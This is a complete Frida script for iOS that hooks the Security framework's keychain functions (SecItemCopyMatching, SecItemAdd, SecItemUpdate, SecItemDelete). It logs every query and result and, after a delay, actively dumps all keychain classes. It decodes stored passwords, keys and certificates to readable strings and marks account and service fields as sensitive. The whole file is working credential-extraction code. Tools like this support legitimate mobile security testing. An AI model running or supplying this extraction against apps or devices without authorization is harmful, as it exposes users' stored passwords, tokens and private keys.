/*
 * iOS Keychain Extraction — Frida Script
 *
 * Usage:
 *   frida -U -l dump_keychain.js -f com.target.app --no-pause
 *
 * Features:
 *   - Hook SecItemCopyMatching to dump keychain queries and results
 *   - Hook SecItemAdd to capture stored items
 *   - Hook SecItemUpdate to capture modifications
 *   - Extract kSecClass, kSecAttrAccount, kSecAttrService, kSecValueData
 *   - Monitor kSecAttrAccessible protection classes
 *   - Log all keychain access patterns
 */

if (ObjC.available) {
    var TAG = "[Keychain]";

    // Security framework constants (CFString pointers)
    var SecItemCopyMatching = new NativeFunction(
        Module.findExportByName("Security", "SecItemCopyMatching"),
        "int", ["pointer", "pointer"]
    );
    var SecItemAdd = new NativeFunction(
        Module.findExportByName("Security", "SecItemAdd"),
        "int", ["pointer", "pointer"]
    );

    // ============================================================
    // 1. SecItemCopyMatching — Dump all keychain reads
    // ============================================================
    try {
        Interceptor.attach(Module.findExportByName("Security", "SecItemCopyMatching"), {
            onEnter: function (args) {
                this.query = new ObjC.Object(args[0]);
                this.resultPtr = args[1];
            },
            onLeave: function (retval) {
                var status = retval.toInt32();
                if (status === 0) { // errSecSuccess
                    console.log(TAG + " SecItemCopyMatching SUCCESS");
                    dumpDict(this.query, "  Query");
                    if (!this.resultPtr.isNull()) {
                        try {
                            var result = new ObjC.Object(this.resultPtr.readPointer());
                            if (result.$className === "__NSDictionaryM" || result.$className === "__NSDictionaryI" ||
                                result.$className === "NSDictionary") {
                                dumpDict(result, "  Result");
                            } else if (result.$className === "__NSArrayM" || result.$className === "__NSArrayI" ||
                                result.$className === "NSArray") {
                                console.log(TAG + "   Results: " + result.count() + " items");
                                for (var i = 0; i < Math.min(result.count(), 10); i++) {
                                    var item = result.objectAtIndex_(i);
                                    dumpDict(item, "   [" + i + "]");
                                }
                            } else if (result.$className === "NSData" || result.$className === "__NSCFData" ||
                                result.$className === "NSConcreteMutableData") {
                                var data = result;
                                console.log(TAG + "   Value (data): " + hexDump(data) + " len=" + data.length());
                                tryDecodeString(data);
                            } else {
                                console.log(TAG + "   Result class: " + result.$className + " = " + result.toString().substring(0, 200));
                            }
                        } catch (e) { }
                    }
                } else if (status === -25300) {
                    // errSecItemNotFound — still log the query
                    console.log(TAG + " SecItemCopyMatching NOT_FOUND");
                    dumpDict(this.query, "  Query");
                }
            }
        });
        console.log(TAG + " SecItemCopyMatching hook loaded");
    } catch (e) {
        console.log(TAG + " SecItemCopyMatching error: " + e);
    }

    // ============================================================
    // 2. SecItemAdd — Capture items being stored
    // ============================================================
    try {
        Interceptor.attach(Module.findExportByName("Security", "SecItemAdd"), {
            onEnter: function (args) {
                this.attributes = new ObjC.Object(args[0]);
                console.log(TAG + " SecItemAdd:");
                dumpDict(this.attributes, "  Attrs");
            },
            onLeave: function (retval) {
                console.log(TAG + "   SecItemAdd status: " + retval.toInt32());
            }
        });
        console.log(TAG + " SecItemAdd hook loaded");
    } catch (e) { }

    // ============================================================
    // 3. SecItemUpdate — Capture modifications
    // ============================================================
    try {
        Interceptor.attach(Module.findExportByName("Security", "SecItemUpdate"), {
            onEnter: function (args) {
                this.query = new ObjC.Object(args[0]);
                this.attrs = new ObjC.Object(args[1]);
                console.log(TAG + " SecItemUpdate:");
                dumpDict(this.query, "  Query");
                dumpDict(this.attrs, "  NewAttrs");
            },
            onLeave: function (retval) {
                console.log(TAG + "   SecItemUpdate status: " + retval.toInt32());
            }
        });
    } catch (e) { }

    // ============================================================
    // 4. SecItemDelete — Capture deletions
    // ============================================================
    try {
        Interceptor.attach(Module.findExportByName("Security", "SecItemDelete"), {
            onEnter: function (args) {
                this.query = new ObjC.Object(args[0]);
                console.log(TAG + " SecItemDelete:");
                dumpDict(this.query, "  Query");
            }
        });
    } catch (e) { }

    // ============================================================
    // 5. Dump entire keychain (active enumeration)
    // ============================================================
    function dumpAllKeychain() {
        var classes = [
            "genp",  // kSecClassGenericPassword
            "inet",  // kSecClassInternetPassword
            "cert",  // kSecClassCertificate
            "keys",  // kSecClassKey
            "idnt"   // kSecClassIdentity
        ];

        var classNames = {
            "genp": "GenericPassword",
            "inet": "InternetPassword",
            "cert": "Certificate",
            "keys": "Key",
            "idnt": "Identity"
        };

        classes.forEach(function (cls) {
            try {
                var query = ObjC.classes.NSMutableDictionary.alloc().init();
                query.setObject_forKey_(cls, "class");
                query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "r_Ref");
                query.setObject_forKey_("m_LimitAll", "m_Limit");
                query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "r_Attributes");
                query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "r_Data");

                var resultPtr = Memory.alloc(Process.pointerSize);
                var status = SecItemCopyMatching(query.handle, resultPtr);

                if (status === 0) {
                    var results = new ObjC.Object(resultPtr.readPointer());
                    console.log(TAG + " === " + classNames[cls] + " (" + results.count() + " items) ===");
                    for (var i = 0; i < results.count(); i++) {
                        var item = results.objectAtIndex_(i);
                        dumpDict(item, "  [" + i + "]");
                    }
                }
            } catch (e) { }
        });
    }

    // ============================================================
    // Helpers
    // ============================================================
    function dumpDict(dict, prefix) {
        try {
            if (!dict || dict.isKindOfClass_(ObjC.classes.NSDictionary) === false) return;
            var keys = dict.allKeys();
            for (var i = 0; i < keys.count(); i++) {
                var key = keys.objectAtIndex_(i).toString();
                var val = dict.objectForKey_(keys.objectAtIndex_(i));
                var valStr = "";

                if (val.isKindOfClass_(ObjC.classes.NSData)) {
                    valStr = "[DATA len=" + val.length() + "] " + hexDump(val);
                    var decoded = tryDecodeStringReturn(val);
                    if (decoded) valStr += " → \"" + decoded + "\"";
                } else {
                    valStr = val.toString();
                    if (valStr.length > 200) valStr = valStr.substring(0, 200) + "...";
                }

                // Flag sensitive keys
                var sensitive = (key.indexOf("v_Data") !== -1 || key.indexOf("acct") !== -1 ||
                    key.indexOf("svce") !== -1 || key.indexOf("labl") !== -1);
                console.log(TAG + prefix + " " + key + " = " + valStr + (sensitive ? " [SENSITIVE]" : ""));
            }
        } catch (e) { }
    }

    function hexDump(nsData) {
        try {
            var bytes = nsData.bytes();
            var len = Math.min(nsData.length(), 64);
            var hex = "";
            for (var i = 0; i < len; i++) {
                var b = bytes.add(i).readU8().toString(16);
                hex += (b.length === 1 ? "0" : "") + b;
            }
            return hex + (nsData.length() > 64 ? "..." : "");
        } catch (e) {
            return "(read error)";
        }
    }

    function tryDecodeString(nsData) {
        try {
            var str = ObjC.classes.NSString.alloc().initWithData_encoding_(nsData, 4); // NSUTF8
            if (str && str.length() > 0 && str.length() < 500) {
                console.log(TAG + "     → UTF8: \"" + str.toString() + "\"");
            }
        } catch (e) { }
    }

    function tryDecodeStringReturn(nsData) {
        try {
            var str = ObjC.classes.NSString.alloc().initWithData_encoding_(nsData, 4);
            if (str && str.length() > 0 && str.length() < 200) return str.toString();
        } catch (e) { }
        return null;
    }

    // Delayed dump to allow app initialization
    setTimeout(function () {
        console.log(TAG + " === Performing Keychain Dump ===");
        dumpAllKeychain();
    }, 3000);

    console.log(TAG + " === Keychain Extraction Active ===");
} else {
    console.log("[-] Objective-C runtime not available");
}
